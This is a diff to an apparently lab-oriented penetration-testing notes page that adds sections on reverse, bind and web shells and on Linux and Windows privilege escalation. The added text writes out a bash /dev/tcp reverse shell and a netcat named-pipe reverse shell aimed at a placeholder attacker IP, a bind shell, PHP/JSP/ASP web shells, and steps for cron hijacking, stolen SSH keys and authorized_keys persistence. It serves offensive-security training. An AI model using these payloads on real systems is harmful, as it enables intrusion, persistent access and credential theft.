@@ -26,9 +26,9 @@ Use this page for first-pass concepts, common tools, and early service checks.
 
 * [WF-Service Enumeration](wf-service-enumeration.md)
 * [WF-Web Enumeration](wf-web-enumeration/)
-* [WF-Reverse Shell](exploitation/wf-reverse-shell.md)
-* [WF-Bind Shell](exploitation/wf-bind-shell.md)
-* [WF-Web Shell](exploitation/wf-web-shell.md)
+* [WF-Reverse Shell](wf-reverse-shell.md)
+* [WF-Bind Shell](wf-bind-shell.md)
+* [WF-Web Shell](wf-web-shell.md)
 
 ## Foundations
 
@@ -606,9 +606,9 @@ They turn one exploit path into usable access.
 
 ### Shell workflows
 
-* [WF-Reverse Shell](exploitation/wf-reverse-shell.md)
-* [WF-Bind Shell](exploitation/wf-bind-shell.md)
-* [WF-Web Shell](exploitation/wf-web-shell.md)
+* [WF-Reverse Shell](wf-reverse-shell.md)
+* [WF-Bind Shell](wf-bind-shell.md)
+* [WF-Web Shell](wf-web-shell.md)
 
 ### Access paths
 
@@ -634,46 +634,284 @@ A payload usually hooks into `/bin/bash`, `cmd.exe`, or `powershell.exe`.
 
 ### Main shell types
 
-| Shell type        | How it works                                           | Best use                                            | Main limitation                             |
-| ----------------- | ------------------------------------------------------ | --------------------------------------------------- | ------------------------------------------- |
-| **Reverse shell** | The target connects back to your listener.             | Best default choice during exploitation.            | Needs outbound access from the target.      |
-| **Bind shell**    | The target opens a port and waits for your connection. | Useful when the target can expose a reachable port. | Inbound firewall rules often block it.      |
-| **Web shell**     | A script runs commands through HTTP or HTTPS.          | Useful on web servers after file upload or RCE.     | Usually less interactive than a full shell. |
+| Shell type        | Connection direction                                 | Key advantage                                                            | Major drawback                                         |
+| ----------------- | ---------------------------------------------------- | ------------------------------------------------------------------------ | ------------------------------------------------------ |
+| **Reverse shell** | Target dials out to attacker.                        | Bypasses most strict inbound firewall rules.                             | Fragile. If the connection drops, you must re-exploit. |
+| **Bind shell**    | Attacker dials in to target.                         | If your connection drops, you can reconnect immediately.                 | Modern firewalls usually block the new inbound port.   |
+| **Web shell**     | No persistent connection. Request and response only. | Blends into normal web traffic on `80` or `443`. Often survives reboots. | Completely non-interactive and stateless.              |
 
-#### Reverse shell
+### The reverse shell blueprint
 
-The target connects back to your listener.
+Use a reverse shell when the target can connect back to you.
 
-Use it when outbound traffic from the target works.
+It is usually the best default option during exploitation.
 
-Start with [WF-Reverse Shell](exploitation/wf-reverse-shell.md).
+Start with [WF-Reverse Shell](wf-reverse-shell.md).
 
-#### Bind shell
+You can also use [Payload All The Things reverse shell references](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) to find a fitting payload.
 
-The target exposes a listening port.
+#### The Netcat listener
 
-You connect directly to that port.
+Before you execute a reverse shell on the target, your machine must be ready to catch it.
 
-Start with [WF-Bind Shell](exploitation/wf-bind-shell.md).
+```bash
+nc -lvnp 1234
+```
 
-#### Web shell
+* `-l` — listen mode
+* `-v` — verbose output
+* `-n` — numeric only and no DNS lookup
+* `-p` — local listening port
 
-A web shell runs commands through HTTP or HTTPS.
+{% hint style="warning" %}
+**Critical check:** Use your VPN IP from the `tun0` interface when writing the payload. Do not use your local `eth0` address. Hack The Box targets can only connect back through the VPN tunnel.
+{% endhint %}
 
-Use it after file upload, write access to the webroot, or web-based RCE.
+#### Reliable one-liners
 
-Start with [WF-Web Shell](exploitation/wf-web-shell.md).
+**Linux — Bash**
 
-### Shell stabilization
+```bash
+bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'
+```
 
-Basic shells often lack job control and terminal features.
+**Linux — named pipe**
 
-Upgrade them early.
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> <PORT> >/tmp/f
+```
 
-Common fixes:
+**Windows — PowerShell**
 
-* spawn a PTY with `python3`
-* set `TERM=xterm`
-* set terminal `rows` and `columns`
+Use a `.Net.Sockets.TCPClient` payload to stream terminal input and output over a raw socket back to your machine.
 
-Use [WF-Reverse Shell](exploitation/wf-reverse-shell.md) for the full upgrade flow.
+### The bind shell blueprint
+
+Use a bind shell when the target can expose a reachable listening port.
+
+Instead of catching a connection, you force the target to host the shell and wait for you.
+
+Start with [WF-Bind Shell](wf-bind-shell.md).
+
+You can also use [Payload All The Things bind shell references](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) to find a fitting payload.
+
+#### Reliable one-liners
+
+**Linux — Netcat bind**
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+```
+
+**Linux — Python bind**
+
+Use a Python inline loop that binds to `0.0.0.0` and exposes a shell on the target.
+
+**Windows — PowerShell bind**
+
+Use a `TcpListener` object on the target machine to wait for your inbound connection.
+
+#### Connect to it
+
+```bash
+nc <TARGET_IP> <BIND_PORT>
+```
+
+### The TTY upgrade cheat sheet
+
+When you first catch a shell over Netcat, it is usually a dumb shell.
+
+Tab completion, arrow keys, and screen clearing usually do not work.
+
+Use this exact flow to upgrade a Linux shell to a stable TTY.
+
+```bash
+# Step 1: inside the raw Netcat shell, spawn a PTY shell using Python
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# Step 2: press Ctrl+Z to background the Netcat session
+
+# Step 3: on your local terminal, switch to raw mode and disable echo
+stty raw -echo
+
+# Step 4: bring the Netcat session back to the foreground, then press Enter twice
+fg
+
+# Step 5: fix terminal settings inside the upgraded shell
+export TERM=xterm-256color
+stty rows <YOUR_ROWS> columns <YOUR_COLS>
+```
+
+To get the right `rows` and `columns`, run `stty size` in a normal local terminal first.
+
+You can check your terminal type with `echo $TERM`.
+
+### The web shell blueprint
+
+Use a web shell after file upload, write access to the webroot, or web-based remote code execution.
+
+It works as a command bridge over HTTP or HTTPS.
+
+Start with [WF-Web Shell](wf-web-shell.md).
+
+#### Native language one-liners
+
+**PHP**
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+**JSP**
+
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+**ASP**
+
+```asp
+<% eval request("cmd") %>
+```
+
+#### Default webroots
+
+If you already have remote code execution, drop the file in the directory the web server actually serves.
+
+* **Apache on Linux** — `/var/www/html`
+* **Nginx on Linux** — `/usr/local/nginx/html`
+* **IIS on Windows** — `C:\inetpub\wwwroot\`
+* **XAMPP** — `C:\xampp\htdocs\`
+
+#### Interact with it
+
+Use `curl` or the browser to send commands without keeping a persistent session.
+
+```bash
+curl http://<SERVER_IP>:<PORT>/shell.php?cmd=id
+```
+
+### Fast decision rules
+
+* Use a reverse shell first when outbound traffic works.
+* Use a bind shell only when the port is reachable from your machine.
+* Use a web shell as a bridge to a better shell.
+* Upgrade a raw Linux shell early.
+
+## Privilege Escalation
+
+### The privilege escalation mindset
+
+When you first compromise a box, your access is usually restricted.
+
+To gain more control, switch from external enumeration to local enumeration.
+
+```
+[Initial Access: Low-Privilege User] --( Local Enumeration )--> [Identify Misconfiguration/Flaw] --( Exploitation )--> [Root / SYSTEM Access]
+```
+
+### Enumeration frameworks and scripts
+
+Before you escalate privileges, collect data about the local operating system configuration.
+
+You can do this manually or speed it up with purpose-built scripts.
+
+#### The trade-off: automation vs noise
+
+{% hint style="warning" %}
+Automated enumeration scripts run thousands of fast system commands. That creates heavy noise and can trigger EDR, AV, or SIEM alerts. In stealth-sensitive environments, prefer manual enumeration.
+{% endhint %}
+
+#### Key tools matrix
+
+| Resource / tool                | Operating system  | Purpose / details                                                                                                                           |
+| ------------------------------ | ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
+| **HackTricks**                 | Linux and Windows | Industry-standard online checklist repository for local vulnerability checks.                                                               |
+| **PayloadsAllTheThings**       | Linux and Windows | Large GitHub repository with cheatsheets and payloads for local bypasses.                                                                   |
+| **LinPEAS / WinPEAS**          | Linux / Windows   | Part of the PEASS Suite. Highlights likely vectors with color-coded output. Red or yellow often signals a strong privilege escalation lead. |
+| **LinEnum / linuxprivchecker** | Linux             | Legacy lightweight scripts for auditing the local system environment.                                                                       |
+| **Seatbelt / JAWS**            | Windows           | Specialized tools for reviewing security settings, patch levels, and running processes.                                                     |
+
+### Common privilege escalation vectors
+
+Focus on the areas where misconfigurations and local flaws appear most often.
+
+#### A. Kernel exploits
+
+**Mechanism:** The operating system kernel is outdated and missing security patches.
+
+A low-privilege process may exploit kernel memory handling flaws to gain higher privileges.
+
+Example:
+
+* Linux `3.9.0-73-generic` is a well-known target for DirtyCOW, `CVE-2016-5195`.
+
+{% hint style="warning" %}
+Kernel exploits carry high risk. They can crash the host or trigger kernel panic or BSOD conditions. Do not use them on production systems without explicit approval and prior testing.
+{% endhint %}
+
+#### B. User privileges and sudo rights
+
+**Mechanism:** Administrators allow specific users to run selected binaries with elevated privileges through `sudo`.
+
+Verification:
+
+```bash
+sudo -l
+```
+
+That command shows which binaries the current user can run with elevated rights.
+
+Exploitation hubs:
+
+* **GTFOBins** for Linux — shows how to abuse legitimate binaries such as `echo`, `tcpdump`, or `find` when `sudo` or `SUID` access is present.
+* **LOLBAS** for Windows — catalogs native living-off-the-land binaries that can execute commands or download files in privileged contexts.
+
+#### C. Scheduled tasks and cron jobs
+
+**Mechanism:** The system runs scheduled tasks under the context of `root` or `SYSTEM`.
+
+These tasks often execute scripts or binaries at fixed intervals.
+
+**Vector 1 — direct write**
+
+If a low-privileged user can write to task configuration paths such as `/etc/crontab` or `/etc/cron.d`, they can add a new task that triggers a reverse shell.
+
+**Vector 2 — file hijacking**
+
+If an existing cron job runs a custom script from a writable path, overwrite that script with your own commands.
+
+#### D. Exposed credentials and password reuse
+
+**Mechanism:** Administrators and developers sometimes leave plaintext credentials in config files, logs, or shell history.
+
+Common places include `.bash_history`, application config files, and PowerShell history such as `PSReadLine`.
+
+Exploitation path:
+
+If you recover a password from a file like `/var/www/html/config.php`, test it for password reuse immediately.
+
+Common next steps:
+
+* switch users locally with `su -`
+* try network logins such as `ssh`
+* test whether the same password unlocks a more privileged account
+
+#### E. SSH key manipulation
+
+**Vector 1 — read access**
+
+If a low-privileged user can read another user's private key, copy it and use it to authenticate directly.
+
+```bash
+chmod 600 id_rsa
+ssh root@<TARGET_IP> -i id_rsa
+```
+
+Private keys must have restrictive `600` permissions locally or the SSH client rejects them as unsafe.
+
+**Vector 2 — write access**
+
+If you control a user account and can write to their `.ssh/` directory, generate a fresh key pair and append your public key to `authorized_keys`.
+
+That gives you clean and persistent access without relying on a password.
